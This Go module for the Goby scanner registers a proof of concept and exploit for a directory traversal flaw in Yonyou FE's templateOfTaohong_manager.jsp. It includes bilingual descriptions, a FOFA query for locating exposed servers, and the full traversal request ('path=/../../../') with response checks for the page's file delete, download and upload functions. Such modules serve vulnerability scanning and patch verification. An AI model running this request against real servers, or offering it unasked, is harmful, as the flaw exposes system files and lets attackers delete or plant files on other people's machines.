package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou FE  templateOfTaohong_manager.jsp Directory Traversal Vulnerability",
    "Description": "<p>Fe business collaboration platform is an overall operation management platform based on the management idea of \"organizational behavior\" and the deep integration of business. It can enable managers at all levels of enterprises and institutions to timely grasp the decision-making information of all dimensions, and support enterprises and institutions to make smooth changes in the process of rapid development. Fe is a system platform that takes workflow as the center, comprehensively abstracts and manages business elements, combines and correlates various management elements and business resources, closely integrates information and applications, and realizes the collaboration and unified management between businesses. Finally, it is displayed in the form of information portal, covering the functions of standard collaborative products; The characteristics of its platform have strong secondary development ability and integration ability, and can quickly respond to the management needs of customers.</p><p>Lower version of UFIDA Fe platform templateOfTaohong_manager.jsp file has a directory traversal vulnerability. An attacker can traverse the contents of system files through this file, obtain sensitive information, and use the functions on this page to create folders, delete files, and so on.</p>",
    "Impact": "Yonyou FE  templateOfTaohong_manager.jsp Directory Traversal Vulnerability",
    "Recommendation": "<p>This vulnerability has been fixed in the new version. It is recommended to contact the manufacturer to upgrade this platform to the latest version.</p>",
    "Product": "Yonyou-FE",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 FE 协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞",
            "Description": "<p>FE业务协作平台是以“组织行为学”管理思想为核心，业务深度融合为基础的整体运营管理平台，能让企事业单位各级管理者能及时掌握各纬度决策信息，支持企事业单位在快速发展的过程中顺利变革。FE是以工作流为中心，全面抽象管理业务要素，组合、关联各管理要素和经营资源，将信息和应用紧密集成在一起，并实现业务彼此之间的协作贯通和统一管理的系统平台，最终通过信息门户的方式进行展现，涵盖了标准协同产品功能；其平台的特性具有强大二次开发能力及融合能力，能对客户的管理需求快速响应。<br></p><p>用友 FE 平台低版本&nbsp;templateOfTaohong_manager.jsp&nbsp;&nbsp;文件存在目录遍历漏洞，攻击者可以通过此文件遍历系统文件内容，获取敏感信息，并可利用此页面上的功能创建文件夹、删除文件等等。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 FE 平台低版本&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">templateOfTaohong_manager.jsp&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;文件存在目录遍历漏洞，攻击者可以通过此文件遍历系统文件内容，获取敏感信息，并可利用此页面上的功能创建文件夹、删除文件等等。</span><br></p>",
            "Recommendation": "<p>此漏洞在新版本中已经修复，建议联系厂商将此平台升级至最新版本。</p>",
            "Product": "用友-FE",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Yonyou FE  templateOfTaohong_manager.jsp Directory Traversal Vulnerability",
            "Description": "<p><span style=\"font-size: 16px; color: rgb(0, 0, 0);\"><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Fe business collaboration platform is an overall operation management platform based on the management idea of \"organizational behavior\" and the deep integration of business. It can enable managers at all levels of enterprises and institutions to timely grasp the decision-making information of all dimensions, and support enterprises and institutions to make smooth changes in the process of rapid development.</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;Fe is a system platform that takes workflow as the center, comprehensively abstracts and manages business elements, combines and correlates various management elements and business resources, closely integrates information and applications, and realizes the collaboration and unified management between businesses. Finally, it is displayed in the form of information portal, covering the functions of standard collaborative products;</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;The characteristics of its platform have strong secondary development ability and integration ability, and can quickly respond to the management needs of customers.</span></span></p><p><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">Lower version of UFIDA Fe platform&nbsp;<span style=\"color: rgb(22, 28, 37);\">templateOfTaohong_manager.jsp</span></span><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">&nbsp;file has a directory traversal vulnerability. An attacker can traverse the contents of system files through this file, obtain sensitive information, and use the functions on this page to create folders, delete files, and so on.</span><br></p>",
            "Impact": "Yonyou FE  templateOfTaohong_manager.jsp Directory Traversal Vulnerability",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">This vulnerability has been fixed in the new version. It is recommended to contact the manufacturer to upgrade this platform to the latest version.</span><br></p>",
            "Product": "Yonyou-FE",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")",
    "GobyQuery": "title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2022-07-19",
    "References": [
        "https://blog.csdn.net/qq_41617034/article/details/124268004"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "6.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "deletefile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "downloadfile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uploadfile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "backfolder",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "deletefile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "downloadfile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uploadfile",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "backfolder",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "/../../",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10479"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
